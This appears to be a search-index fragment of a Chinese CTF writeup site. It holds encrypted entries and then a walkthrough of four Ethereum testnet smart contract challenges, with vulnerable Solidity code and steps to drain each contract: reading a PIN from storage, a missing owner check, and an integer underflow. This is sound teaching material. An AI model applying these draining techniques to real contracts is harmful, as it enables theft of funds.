ezH/34+C2Iqj9e0mPBVYkpvoL7l5zxn8AdCwFodLON83+EpGgc2rdHQwO0LmlKOa8/HL/J1XNXiykzKh1EoWVc4C8/8MT8UC3cVhm5VBNFrcaup8zVBnjJhZm+/2ulCnst/pUgK/EDBoLnoLcY8h6g50NYuBEARbWwJ6rqa8/ryfJLMFky/US4JWYc9D0/vKg9WFZclFRZKmgUjccE1gPlxRgiJhNjUQlTOFrahPdtneflQF6jKPssLdjqa/JwvPP8MUCf+sjLNId/ZJqMKPZ6IJikjOiMegm83JMRksOKOazKwbw0+FkDfhFAPkj2R5zO9Jetmdnodd4MbelbAaAPvLUylhF7HKmIpadmanY+9zUPXq0AatkHn/dYnqqPjVjnRqHdqbKd1SxbKiw/io6yv4OPFm47NWDzRFXC00/iRculTiYsg98jL1EZAviq9LIXy/luFRetKD7eL3LZC8jEVeHEry14Ucyr2mQA0QM07+b4vEdqxa9KWzsk9LjLa0Uc4sT53YXjPC9ljG9RowHlcaJuu6AHAtdRju35FJ3dsHI6sXDz+Qn4MmFATLi85ccPYFXy+2pbcwi40+NSYU99jrj9ynVNyOkh/UZuogqA0kRIq7dMBAlDYjKhEXi/aQ4Cn62KYSWCGcwVEFsWGey+YyVVOcFWx/u6+R4YTmU5/LxxYziCMb1MAStqf+rO0nqutJrjxcd7la4bdwpfUnIffLn1dd9k1SrDPzD8PG0lhgucoRxEjuSNDvbejg1klMcrmGdP3wXrcInv5mt5qI2p1arP6ELJUp1oO/QSP/ZUGRNdvuThMyLgkxyFC4BaUUIYwHs7Z++nHW2ebpQ4LMVWZAyBSQIDE087KONpUW3r6gegDUDCMHYeM/vFTjMaevMwROM1nDhpb4iDvEEEpPT/8ZQOqaiTFnP1VTCxR18P0SE03KguTGzoT0el81WD/sXmMujXGqnvWuwWgseO8kFu0eYx3qU6UEzp8Y0VmF4exVJmotxxZYFA+xYY85dIrUZ7Iwkvya0syevZOBfEGF+PThT5omlpEvAl4KhP2fBA6jdQps1jDIiJBkS9/+RfR2qygmFsjgI2uAYQ1N0Ba5ZX/0q8cBs1uX5YEdeq1ORdmxSJeaxpLM2x6MRKYoCEC8jflZqphFE6rwPZBV6OAThg==;^","title":"blockchain quiz2"},{"location":"writeups/AAA/#hard-gambler","text":"YlFtvVdXSdEaPHNpVzu1NA==;+j0D7lamO+ElJcRBLtcve7UmjNTr9k03mrRFNP8Pt9d1oyv2vsj9l0vIli1hfYyfPEJx+11boJUsayu1jxjswA/HL+5RLGMkh+4MwS9YFlWu6vQVmOulO15NVNiepx7EnM+izR06IoHMmhSPruk0dz7dlbeIz7MiZHJpsaD5sDW1fC0+5hOkzFoS+GDO8qAnkyelW75xiegg8T+75q9rfk3/k3wwyXT3c+oo3EHFlGJxxWMvS8TQiCkOT5Y7vp8IGVmSbAGMtP+3jMrN5gl+T+F8CdUNZealL1OixiN1sRsRhhlPBiV2X0oPq66tbn0+Jh2qBZWBbswAkR+GY0C9/Z9xeUu0Z2h428TSvd0Yh7pFx16c6XzgPDrVeZgmN/z2UECPrcFCN7RUcRVxSSWkdCnicG8r5HQD/HUGXEdvbOj2JhIu4CWDRMs/X8QdYs2HpDxJbb4NX8AJvlD78XiSks6tLnmei3tEaielpNZYFB2P5MwB+R7CQ9I5S3A5z+ZjJ3Wp4qjb4Ib+AYNQcDzHNgk3FMHAe+M0dka028rk9QSC0y+N2Q401Y6UBx6MiDaIYG0WjlY62/Me0xFPIiOEjd+1pAJ2ZO2J+G6OQdzct41Gcj9Mh6Izvbc3hJBI0qNv9wysjb2ZAq/6cggn6uWix/Ip6eGAaF3HUyMn9UUeG5mwGNKSQALNmfB17OwgLwDkNYyjUxR+sheyu2EpVEDZJcRTiXg5o4EG1Z77V1pwE0e11pTyK/zZI8Sa+iF7NROVmf5ufroKslldZuWjTQqh7Zty6THNvwLYq0vkETVLxsvlhAS8ugVcRzLTLZ6rwGtHyPq4d4h9pgjBv5Z2Kb4Y9szunIdYj+5gHwTdPLKGrPtM9ctb0oGb6Z0rclihSC9ZReVlvxOdDesgH5kt/UuZ6uPwg63p6Olida8A9Qp2vmPwP0V1VCOcdynrRkiPqIUlEZ5Mes7d/DpSWWJbdydtwtxPtnkPl3czvCOR5sevb0zDpfKOlGnvK98EYOJ6opYXQnE0+YYDd8OhN8t5yTauNeAfyhAs/3+kGQeKrzI+lNNgwMdmWgj8OwV0QmNV//1MLeTCL9rxKsU7eCdZ1VSXfCo1/XI/cLNIOLTrYnF+rbUmVhcrxYNPqyCWZMOx2Ysbi+6ot7yzWPQSkM+7UzdZE//DjueOPzdIJlfxBEg4qh7V8sa2w5SmChqSjpPt2GqvZxrgOAludy5RP+2D83+sGB290XARQBxB69PMFXrJ5MQ0LHNabd5FvCGybF7uUx4sfF5vKmCUfDKEVu4xSXjZsDfq1Tl6RYszE+nH9uhkBtfkser17K4YRi2LRk/jeu0sV+lk8K6SuWqGpP2Sn5cxSiCLPyfL2Y/6xZgUFyp+vRgwAHecPfGDG3d1S8N5mEb8SHXEdr2D8dDDladBoqlBnYZZ7Zzk5ndd1LreQTW2w1uS9a1xy+WryUo3MB/F/DyYRj7QFwmbLWgDVGf7ab3GZKwzpxlSHuTT/rbgDir240WY67N796CHN953FGXA8yXUs40tPedoCkyJQYvKPbVQLprLQc0WlvAb743k2LVE3FaGUsazS4vRra7xp9iMOIntsTa8gOYIThbjj+PZFiz9UGG4+JleF2TBmK2s1K+Nm7gmsCcvYmCF/FVrjzpAK+mnyaG7Pso2vaMvHC70hZvwCWQNdXjcPYmfMfngzNLSSUmuHrCvFs3NjrksyPAXrH8tQIFZbfZn+0B5/ltoEzb+uvMaj1vzYPWNrLW9u4ziFo8iyeFveQUWJ1V4lGKuDw1rIFjeswy++oZwR+c7ehnUJjT9ZKdp3NVrOm9rRYXP5NXQV4Uq/hW0h6t77CRWlI3R+bGLQ7R4WN6dkQGkoUmUE9qmVgFeHBSUClYJk8pDOm+FPvM2yWqbSSucFc0V/HkwopQEVIRBB4GHcngnrqUMyJoGUCvOEaPkBLfl339b+rolSrPzHdG25/c1DcGT/mlpR+VmkWGqafFn8z3Y0SvyJSYRGpBC3Bfq/iEFNldIXCauN1lY74U94M5GPm2ZkkrQSyChCjDI3qGG2ANBrBnUWuBjWrwM8fnDwplsIYmlFhSXr0jdJmhMDZsBh5/qYKtx0RgOcJrmCpG6XniewcnRd/CT8WbRZGF+FHHLVE+HkGOafG69Nt62ncn5IQD0bLhCnIVZPepE8nxfMbSN3HjqO4HnIYB5dm938TCp7g6J7TFnQN4onBsZEA+ErUJkaPYdH0gxd1+Vajn06CKUGp8itIUOLz2bYM9ydlPelk23mwxi4+K3kaiCjM4iB4HwnMvuJ7PoG6JJro/EYnBU8PKBkdzeLK4Gv3f5thlZDxCZHkKDAxley/FyUw/6ve/c/VX6X41rFViqJlcVlZBNzQbm1SBmsYuXwxYxBJkS4kWqEblxSqFcOotSXWSc5LJrAblKqAmCBZ4GaD5I6Uqv/tYaRk3EsCKdjFxaWVUEMjWlQBKMfGFhty3oaj8QaHZVrd9fyeUOTJRS0IppI4b4nJLz59cz1DWOz0Tn67Jj83RZaRafCZ2zggO7u1uvk42BLpPzYeR0fkqugUSeZ6+N08nhuWKKrkVWdN69Trwubtu4u7/dGPtbj77GzMhH9pVNQ7AMP1NXJhU/GKF1W2brA4fizwFhuwzxPwi0dFcDWcKgiipfGT78IFeY6jmNTgleQfbcqFmPuCH4csmgfkRlgOHc/GGp1/3YeKUuogX1K2HbxtdcVUy/No04IyAYC5zNwZIO/6PG6LsoHR4i8mpWCCc4YQz1dVsFNVyUntzKhD16CVG7LgBvQOwDdKJ8FtZg4Hjm0DD02X3HiA/7CU4tNxU6NxCufDyCylGEFTc5zRhSLzGsxMaMq5TrkKb8IS8grLLqzVbvH/lrQJnPCQnkRheWeoGzNL//uJS6uzDLGd9WpDsrXzme0htvAbDpf6Pg5JRjfvLLJSTUc4eueOqYCTT8F2Yp6QiPADwc6xuXFqrs6xuEZa6R00pIRtgtG0a/Y6t2n4NGvoFlf26ypcGHoZg/7Th8NAXhAREWK6Qc9n6VKhPV4UDupmvSxvp1/JqffjZgqi6/QVFAIOz55dTtQ1AG0MynTw7iTkiKf5cUKfJNMn5Xd269bywT2vlXNMr9UdQ21T2L6Bd7427NOvFdP3MqC7yrq1E6IKdaH/oDIXNFqQ4zs5EDFIYpm48qslgjycV3MlkDv2h9h08AtLqk0SoVfCkNYM+NZVmjxPzDBGKqFNGDjtuFPuNzY1SfXr+LeDp7NmAVc/xL7ReQeCKFZICWbgsyUeQYV3mSbhqwrJ3ia4eRdB4tzc5fuiccUYp47v3DfNQSDQ7kFjcSEbSMGtDO2eDHgmqoPu8hBeC3QMAJiR8CidSXLgwZMygDcpN8gCU1G/uDKVt1C1KPgQT2DEWxUWqiDJSeJBFoEFKOHsh+CSosctP1iwvauPkNMs5EW138hRexjmB28bWp9q5QfIRIus5FCr+SPE7eLiphWQNVhC1Yzv+3uzBEp30i9YdVzAJX+7lc9DqwMBAsIqxh/by3xNPmIIBK2gzp7NMUCBx/kwb94am2agSEH6gEGIdaDC566kwk4FMskVfoE00EIKq9D18zII7nb7EbOiPrXadMqc+G9H+M59w0ASyyptefXhbH1tkO7aXR/77fvvKD9BqoSe+VuI0qsVOcbFgA5V5kJBiHcl0I/6infBnb7u9lLYtCzt3jUIyr9U95IOR89yCwXFoF62StCmpwB6pv7bwyvFkgbt/TzJ/1ifFG1Gln91nu1DFEwtIQhgR1OFJ3/Lqe8zti+XKGeuYeya8fCOmhyoYIWd5yuqr762ZSDrMGlnO3lfR1CENxbdAr85agXjGm2iq0+H5OK83QYkgfuVk28xs0SsLqdOp0Zk5LfDx4cbs6oI4AASABYJ3qJ8Sl75uTfmeFNcvZLS8Xv053hhFFdKvLb/ixCvW7/V2N1wS8IwC5EAa++6ngGIy/ewWSPJT2UpbXTLocaj5FtWg2ttELqEzZ73Hly305bnFX0kv6oUYGfNmr4if8SB2jdVBSt0MGdVyq9HNJItEj7Bz88z8OmmWuigxDD1iv5jfEa+l/ql24QfOWuZMSTbszSjzqpPS36KWFNckJE6A5Yogm/Kc9UvCWE98ZjB1dwDvCHomhE6fFN6v6bHyKMtnu0XErzJGKYOuP1R+dweCEb1gobH0CTskkNijSZgatgo7K3Z92pndPcIJSqX5H7tPRupgITfI/1IQVh9EPJ3eTlpwEktkjw0f0sgg/AhQ4gwh0cGUZL3jfyWIes5jHD2145F11fVKT7e/SxUoGfqJXnzUivxpWTJlXc4CJ3OJ7i1ECy6/aPTJbC9dQ8mQ+XckclIDlfQ4xa6ifBrH9jUSAXn2bicf3buhKUbqWw0iZV0U8fM6MnccqQgJb2Uie8jEsuB1SQ6K1Dg==;^","title":"hard gambler"},{"location":"writeups/AAA/#money","text":"TKO1HVzB+rjGbnjL70DA2Q==;WOJ/cPmsfqbS+cZkhNQCXLxt0bx/x0G7aATXi9uqGjU9jb/4cz5Kq4gpxSOFYJr1xb2gfL1iVBJxpmJyOJsEWDScy5OzQhfxN0uBAO0hCLzEiZSAmL2y52GtuXRHAp+xr5Qzwn1Z0VmP8eJ85lYoCRHwsxz4cDA+e2xRqKjyL/UUTB74Tg8zytGfLdtcMAf1NzDycvqPyQW8oSW/DbnCPH4H/hiQHLjPPeRyP14kdoOpFBWfxzgvnDiDZTBpbBsfSf/TkFX+JMyRJ92xVfiDn0sgRrpBtxQWzifg8gawbUJ/0f1k43vRF6mJgXIzmAfwhWEYZNCPAmtaKn1OiPF2wHdD8+UNBjmnpK2HGg+HHctZu9C9w4qsc+fxIS8qWk0Q6lgkEr0DPUgK6cU7ioahSKEea9g4SotXI93FHVTBu6qzTf+Rhz4BH43zii2HBICGWjt+9tB8RtjQNDDf8gHh2ZAbMI5b1T6lOG3P2nfmkY3VDqISyC1kJ5yqJHhWE7A60T7XN8m/Ui6zEcfvsFrQdbLy1yIQMXmlZgAKwC8YmOVGNrRMwOS1No1L2t+F8xF0qPeW3ANzJ2eHoPHIBXa484DtUGOEdEQaP6GftecFa4RBVcVAKmAVgbG8LA6znt5iTYgAQA5Zo2oz+apVt36qkEn5+VnuxfxNuPqLIYybA9DJFZB/G05LQH1sQZdnAK6KLOJlEduFjmoHPvfkrhl8rjN4qLcUGaYL6lf81NXZ8DCzlzFPMSNQscJ1Ev51mZoanY9cAOXzIYjt8VVBnvslRaXpxQhrwDdw8k3N7KwmIfXGX008kvVVCiwBqtgKYp6E1i0rmQe/086UC51GAHsY7vpewxMM5nPIi2Mkkr9iEEWJk6qA+HiWyxSVCq2OYeNa49L/ZxN8AynY6VkxWrAYDgvtyPKEUAziQeYKirzy+hvzfdmmd/xFQg10CTGvdWU/HFccfzIxvtD5w5K6TbIH0PZPTl9lh4vC5SFvOynCX9mTSm916bA5e2JJIZGPVPihLwQ+aVfQLo9X6b7UtH7wNnvSfMdimo9u9bSER6jnU8b8lQaMLiUovy5YdMAGVYs1EZlMobQMaOlWEX4kos3lsS+99ma584gc0ybvsA2My5twcwYKj/pHw0HNdRAQE9JVPNsGDb49f3nG2CkD5UKNHDjqcuyvURPClhIlF7IZMWYUwDGoRjmPtmtlEUqQiKavMfUC9CIBvtRG+l1UOqLd4mDvI39KtCpYWFFZUpySwlDCCER/mfXeCZ6xVkhkHdlnSeYf1cGnIVlO9OaUXoHmVMd3yCz4py0dk+E3b/gcHJrjtD/8J/ZYqsrywAUfBgsUixuFPgtDxC/DzG8rosEYEqU7qXEV4gHs5h5+jkfAwJ2Nwj4qRVCywDzrp1L9LmpJiPpSW3BnH4xcE8yDWFmMPsAJjlhY8BET04lFRqmeKuO2ycXgjbfh8uo4Ig6bXLhc4lq5Z1xXmrHmlk5H0aECC0I8zLiG2XPJfpj5CH7Ui3nkE/S6oA3vbaqfJXRo9oQ+7fHEeqUE7uepnfu+6j1LgnwRs6s12bmMnuWt9jKdH5cDo8/myBX9mmMq3Xmg/e8pyLOocLNXUFlAUZW3q42o+D0qtqsMUom8TbrAeMRvIaJN12NYeZPa9ak3Ul8FIGMRKP6999YrezD7Yl4H4J6Z2Wi2aDFcOrXzVTZ3Xx5p5CuKZ+5pt9YRVzFdgGcvb82fPV7ljiqV3UQgDPlblelShlchvnkwPNn+vNUiXdsDoJ7Mz6uXFpdkpBZFxQF7foqVOtVgYtBOFNoXTiM9benLzdT9WnPYtuLUZkpDePZCNDRcQJj53s4l5weMc9ERKAUZtkmcjuKvcgsUYHwY+YIaU9nS98Na8A7kaMT39RGmkt2axw/mar1F6TGo9QCosoLJW+JYANd+mc8eyRTlg5KgBw/RmfT7wK5QCPnzFCr8wux2PqX9rWXYSJSo5yFkRBSoU/pEFoiw0daPz+fYNf7HImnFvRrN+QsvBvAbpZB8nu7+R9+jXo6bDplp2f6oQo5XuoXvAAIer3zbfGOg9LyOd7dN0u2TOfshTRAz+9h3x+MB/ltqyuvuCVdPSpC0M9a2KnTv4AWtuHKyWntS22XhKxxIz4RGmobjpfgno5KUfHrNM9/oIDq9jtlRmb0wRYRBrniVZsyGIhleFvsJnvhnozEeEP3wjFQBkpZmv1oQ6hCQkWT30Ji0x6C7dGvQGB+NNnSIDEolrab1DnK4y4WHenyvSmu+5aYovFoMnYzQW9kR12/UkGUDl5UpPEXXVehN/gqPUzyETFsAu3tylZhOXBQRElXIz3RtDMtI1aoN5UMxIRx3lbxQWZRDcE2M/ryVN05EwKaiewZ2FIKMJSjfxx1e2rUuHYYYA6GeGoJPShJn+u+1qlb9HXRQDwrInsYzqu4MkMk1l6g+rpw/ivMJUchjIfrz88HnOQun5OOa9e5I0v8DQ83QR50EzxIB/0jYkki4Fx2/bLXXMNWpZ3oNEP5pHEKMsbUBj0qSx7wMrVb3RuVBNo/j/AIQsKsozfAcD4vsCHY9sSXv9ArPE1+Sq4KMyu7R55EW+T3lVnsLkPLCQn6577tAmH8ZNpRVUfpYtErCm1mx2AbAvZQgSeRpB9BzJplNx4i/tlmEqBbsToa3ZlX0R9r2qWX4tJ5Z4ti3aph91wDOFZwha3uh5WgTAcjfN6A2+jpP9cnmcgVRQMhROUFCuAqh2F+kRWNt11PLwu5+PkJA0HoajVo2rV/6UunJ93XCWitGREPi81fugdWQ6AsND5j9SBBHqJkW+H0yMAAyiRFTbsrCQA8dyWyblDgyEn2iqKddpbX5iNrK1t5U8shsNFeVRx3t4DRpgI+Y2DdLZEHClThiiQ4kse0T1rONFeMGYZLFRcTDdcXvDA2RkOQlQhMYM6uHsLJvhY0/BvT/lKsblYkGWbXaYHV4Nl9VDV4fssbDfWO3o63Q7oJCOPFyU6Xz27GKzy39HFG0OOzNZ9rA+l3cUP/Idib2A8EWs/oo7KKtsfyBiTqx0px745fhdT+ZBu37XUl2cYkTQE4DVnwx89n5G9yU4MY/wXrDNLAqo1QQrBRBc4dtTNxVi8pDNnikcwT0JIglvM8VQbVTg2XtE4knvpjrhT9R5UPDm7TCYG98dKNHKyQfJr7iYCxtA9P+dkJRFxuH4MP0QygA1IBp8ue5M0kRB5dxmnW6rgN+ANFMltFrVEmyMcpOpAyHJIKYT6EUvCt3oksjhp9E+ds4f3Gy8sCHSEBSwj+jlxYS89P5ZjrZOhSgGdxUIkgLkyQDa4ZR+6bDodSKXLdXAlZMXmNQ+E5DFfp8F40fRV6dzJRklQ57PCmHQFHaZTDtGvBPdnob+VN9RJxkhrYTUa34dnTfG/k9uPFvpgFQ9IGlgD1STfpLzP3jZT9VKsVETw9LvUbGIfKYzpa6CUChGnmpCeNUN6YHMf3jVH8SPZaGTlDDvRv0PZ0hVPDG4UzDUEwk/9hL9J5EcM0czk0LqazCuMlVsbUikZlf6s4yCrLsA3mC8e+aqc/cpAm6BCMPBBy0Vt8/tez0iuZ5BuvWLV99mgsZrGmq4Sm2sH+mo3dYHxXGiodUiP52ovfFtynbNs8jFYae/ChDCMzWefj57nfxXt2acRTGFAOSnkw23XZvgziRuj/F2Q+V2hvXg/jZZP1zUv1i6B21fEhx9LBPShupLVbo/C9PXXZi5AH9WsihXxZPjC7w3FW1tpznjuDekCGPKLNwenBQ08n5/pXQ6o4UlbMT3rc1fZRvrF5xUC8sKOTD1xP465+zGtTyehG70d0qZWytFAGQghkk9kuXmBkKiTG145PWliZoJ/9y+ZIufucyDUJ3Mf9Z8uf8GaQhhSiEs6AHpAxDwb2YmfGrsZIG9aKv777jKqa2vhcBnziRqNpCeqxB/e/M9+GTBk5kBbiyttstauqAVW0kHC6y10hHgDmmTU1PuGYMwQOO+4TsGFNRv/VMRfAltU/nPNf+kb6obw/rXk2AF1YR9m8auImiYPVHCjfvStyGlq4EPO59z8M+AOT00M5a6CC9Kq7r50fqRyCTDhtTYcvfniNE9t9uBeP+tS3YaP/zyaBcowgLlkTg+dW/hlX6oJZ5DwED7QIxJwmX+EnRQV0zpXJK7Rvt9vjpWCnjvt7HznDd7CWUVjcSvzX36xnE/PjbtK2inLYZYdNA0YXFbTIEZvMTFQeOhjMV5Q7HXRd51o5jFIzBidVcXI25OGwd/x7R/AOAssuoF3brbbLeB6BJzfeaAr0iA4Xxd+jsxuGWMNHxjK/MZiYcJFg/egwruXy+EFMmk+z61r+g1RKbYFAxaMbJv6oeh6jqq4qMnT3MnUq6bZ03+yB+4aySZ/0IbBQkcgb7X+n+LSAjKSk1ySFpHJaoDKBYOtilaBM11bl3b43paULtKfSkMneUfJf1PqXlMVODO956vGZbRty3tEGYgG7D1+oKiNOt6CUnUwUUMRXbDyLptWvRljkdX4R3M1grO7a+54S4JN9qWskWBsgjzaSzI7gMH8vcfmHHrfXj80coYzAZrU268TO75oW5bJFm0kTPWDESHPgbKtVLG4jUauLhztFthBQyR5gqGS+sbVV0uYiPmZBTzCljsIn8kTZDwaIxjKbWMhw57nwAlrg/GCzQgYtG9L/rx9DQtPBId38jydgkXzCckxeLKbiGKlp63BlM52LGDLYl6XbwQAdbuc10ajhHPzo5GCs5mUHTDCWoUktbMtVW+cSvYUmI048zSKy8hzhRDc2+WPyJDdAUroGYCvCh6soL6D70Q35dtdec1HDzsyeibDRGkxZd+lZUQhXJfn2CVJsJs54Sk1VrtBwkInKbvh9LAZFafzplXzyUi5h0A79OpIhLMFYACIa7Rgo6vtF6cAbalgR40VSShFh3b21At4Mt9OvBhAB3gyJpi0+6FqZkdfEmkXE4fKOt0+FxCoGS3BXLFjHTPLyA770XBhpai35Hm/QhwfHw3iI5XWZ4RvCRKbUXDo3c7HcPxiyzUG5MohfWnLHJ8HtB4PTwb/S2EAJfuhnMgCXKR1Rj6IabsDtetoSMU3H5t3He5vH1yNfepykh/gp4VbqpgBtkZIeVTPqkeajTwZWgvlEzYX0VPFcoBfnlrv+UKRUn+fipOpPONW/Vvaq2npSb4oH8osuk7j8XSS3uzMXLARBFl6Gr5KCtSpJ+UMh3HigKU+9ozvssodIcvNky8qWKe0g4tJtdCHKNwx8yeAq30NspX+9DGCzjJdGoKYGMVLClpsHLBUl1NcKv3jCIsfQgKI9hZlJFIPQ9Ix3Dormb72bra5VaQzLqNsdrFsk+LJVH6ed4ASiL4XUVMh5O3JFb;^","title":"money"},{"location":"writeups/SecurityInnovation/","text":"Security Innovation Smart Contract CTF Writeups \u00b6 Abstract https://blockchain-ctf.securityinnovation.com/ \u4e0a\u7684\u4e00\u7cfb\u5217\u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6\u7c7b\u9898\u76ee\uff0c\u5165\u95e8 blockchain \u7684\u65f6\u5019\u505a\u7684\uff0c\u8fd9\u91cc\u8bb0\u4e0b\u505a\u9898\u8bb0\u5f55 \u524d\u7f6e\u6b65\u9aa4\uff1a \u5b89\u88c5 MetaMask \u6d4f\u89c8\u5668\u63d2\u4ef6\uff0c\u5e76\u521b\u5efa\u65b0\u8d26\u6237 \u8fde\u63a5\u5230 Ropsten \u6d4b\u8bd5\u7f51\u7edc \u901a\u8fc7 https://faucet.metamask.io/ \u641e\u70b9\u6d4b\u8bd5\u5e01 \u5728\u7f51\u7ad9\u4e0a\u8fde\u63a5 MetaMask\u3001\u90e8\u7f72\u9898\u76ee Donation \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; import \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\" ; contract Donation is CtfFramework { using SafeMath for uint256 ; uint256 public funds ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { funds = funds . add ( msg.value ); } function () external payable ctf { funds = funds . add ( msg.value ); } function withdrawDonationsFromTheSuckersWhoFellForIt () external ctf { msg.sender . transfer ( funds ); funds = 0 ; } \u76ee\u7684\u662f\u628a\u5408\u7ea6\u8d26\u6237\u641e\u6ca1\u94b1\uff0c\u6240\u4ee5\u5728 Remix \u4e2d\u7f16\u8bd1\u4e0b\u4ee3\u7801\uff0c\u7136\u540e\u4ece\u9898\u76ee\u90e8\u7f72\u7684\u5408\u7ea6\u5730\u5740\u8f7d\u5165\u5408\u7ea6\uff0c\u518d\u8c03\u7528 withdrawDonationsFromTheSuckersWhoFellForIt \u51fd\u6570\u5373\u53ef Lock Box \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; contract Lockbox1 is CtfFramework { uint256 private pin ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { pin = now % 10000 ; } function unlock ( uint256 _pin ) external ctf { require ( pin == _pin , \"Incorrect PIN\" ); msg.sender . transfer ( address ( this ). balance ); } } \u53ef\u4ee5\u53d1\u73b0\uff0c\u9700\u8981\u8c03\u7528 unlock \u51fd\u6570\uff0c\u5b83\u9700\u8981\u63a5\u6536\u4e00\u4e2a\u6b63\u786e\u7684 pin\uff0c\u8fd9\u4e2a pin \u662f\u4ece\u521b\u5efa\u5408\u7ea6\u7684\u65f6\u95f4\u6233\u8ba1\u7b97\u6765\u7684\uff0c\u53ef\u4ee5\u5728\u94fe\u4e0a\u627e\u5230\u90e8\u7f72\u65f6\u95f4\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 web3 \u8bfb\u53d6\u5408\u7ea6 pin \u4f4d\u7f6e\u7684 storage \u4ece\u800c\u770b\u5230 pin \u5185\u5bb9\uff1a > await web3 . eth . getStorageAt ( \"0x56e06639308e17fd9d948ebaea5b2e4b4beef06e\" , 1 , ( x , y )=>{ console . log ( y );}) 0x0000000000000000000000000000000000000000000000000000000000000f73 \u7136\u540e\u540c\u6837\u5728 Remix \u4e0a\u7f16\u8bd1\u3001\u8f7d\u5165\u518d\u8c03\u7528 unlock \u51fd\u6570\u8f93\u5165\u6b63\u786e\u7684 pin \u5373\u53ef Piggy Bank \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; import \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\" ; contract PiggyBank is CtfFramework { using SafeMath for uint256 ; uint256 public piggyBalance ; string public name ; address public owner ; constructor ( address _ctfLauncher , address _player , string _name ) public payable CtfFramework ( _ctfLauncher , _player ) { name = _name ; owner = msg.sender ; piggyBalance = piggyBalance . add ( msg.value ); } function () external payable ctf { piggyBalance = piggyBalance . add ( msg.value ); } modifier onlyOwner (){ require ( msg.sender == owner , \"Unauthorized: Not Owner\" ); _ ; } function withdraw ( uint256 amount ) internal { piggyBalance = piggyBalance . sub ( amount ); msg.sender . transfer ( amount ); } function collectFunds ( uint256 amount ) public onlyOwner ctf { require ( amount <= piggyBalance , \"Insufficient Funds in Contract\" ); withdraw ( amount ); } } contract CharliesPiggyBank is PiggyBank { uint256 public withdrawlCount ; constructor ( address _ctfLauncher , address _player ) public payable PiggyBank ( _ctfLauncher , _player , \"Charlie\" ) { withdrawlCount = 0 ; } function collectFunds ( uint256 amount ) public ctf { require ( amount <= piggyBalance , \"Insufficient Funds in Contract\" ); withdrawlCount = withdrawlCount . add ( 1 ); withdraw ( amount ); } } withdraw \u662f internal\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\uff0ccollectFunds \u662f public \u53ef\u4ee5\u8c03\u7528 \u867d\u7136\u5728 PiggyBank \u5408\u7ea6\u4e2d\u52a0\u4e86 onlyOwner \u8fd9\u4e2a modifier\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u90e8\u7f72\u7684 CharliesPiggyBank \u5408\u7ea6\u91cd\u8f7d\u4e86\u8fd9\u4e2a\u51fd\u6570\u5e76\u6ca1\u6709\u5e26 modifier\uff0c\u56e0\u6b64\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528 collectFunds \u6765 withdraw \u9898\u76ee\u5408\u7ea6\u4e2d\u7684\u6240\u6709\u94b1 SI Token Sale \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; // https://github.com/OpenZeppelin/openzeppelin-solidity/blob/v1.8.0/contracts/token/ERC20/StandardToken.sol import \"../StandardToken.sol\" ; contract SIToken is StandardToken { using SafeMath for uint256 ; string public name = \"SIToken\" ; string public symbol = \"SIT\" ; uint public decimals = 18 ; uint public INITIAL_SUPPLY = 1000 * ( 10 ** decimals ); constructor () public { totalSupply_ = INITIAL_SUPPLY ; balances [ this ] = INITIAL_SUPPLY ; } } contract SITokenSale is SIToken , CtfFramework { uint256 public feeAmount ; uint256 public etherCollection ; address public developer ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { feeAmount = 10 szabo ; developer = msg.sender ; purchaseTokens ( msg.value ); } function purchaseTokens ( uint256 _value ) internal { require ( _value > 0 , \"Cannot Purchase Zero Tokens\" ); require ( _value < balances [ this ], \"Not Enough Tokens Available\" ); balances [ msg.sender ] += _value - feeAmount ; balances [ this ] -= _value ; balances [ developer ] += feeAmount ; etherCollection += msg.value ; } function () payable external ctf { purchaseTokens ( msg.value ); } // Allow users to refund their tokens for half price ;-) function refundTokens ( uint256 _value ) external ctf { require ( _value > 0 , \"Cannot Refund Zero Tokens\" ); transfer ( this , _value ); etherCollection -= _value / 2 ; msg.sender . transfer ( _value / 2 ); } function withdrawEther () external ctf { require ( msg.sender == developer , \"Unauthorized: Not Developer\" ); require ( balances [ this ] == 0 , \"Only Allowed Once Sale is Complete\" ); msg.sender . transfer ( etherCollection ); } } \u53ef\u4ee5\u901a\u8fc7 refundTokens \u6765\u8f6c\u51fa\u4f59\u989d\uff0c\u4f46\u662f\u6700\u591a\u53ea\u80fd\u8f6c\u51fa balances \u7684\u4e00\u534a\uff0c\u6240\u4ee5\u8981\u5148\u63d0\u9ad8\u81ea\u5df1\u7684\u4ee3\u5e01\u4f59\u989d\u3002\u4e0d\u96be\u53d1\u73b0 purchaseTokens \u51fd\u6570\u4e2d\u5b58\u5728\u4e0b\u6ea2\uff1a balances [ msg.sender ] += _value - feeAmount ; \u53ea\u8981\u4f20\u5165\u7684 _value \u5c0f\u4e8e feeAmount \u5c31\u53ef\u4ee5\u4f7f balances \u4e0b\u6ea2\u3002\u867d\u7136 purchaseTokens \u51fd\u6570\u662f internal \u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\uff0c\u4f46\u662f fallback \u51fd\u6570\u4e2d\u76f4\u63a5\u5c06 msg.value \u4f5c\u4e3a _value \u8c03\u7528\u4e86 purchaseTokens \u51fd\u6570\u3002\u56e0\u6b64\u53ef\u4ee5\u5148\u76f4\u63a5\u5411\u5408\u7ea6\u8d26\u6237\u8f6c 1Wei\uff0c\u5373\u53ef\u901a\u8fc7 fallback \u89e6\u53d1\u4e0b\u6ea2 \u4e4b\u540e\u5c31\u53ef\u4ee5\u901a\u8fc7 refundTokens \u6765\u8f6c\u51fa\u4e86\u3002\u53ef\u4ee5\u5148\u8c03\u7528 etherCollection 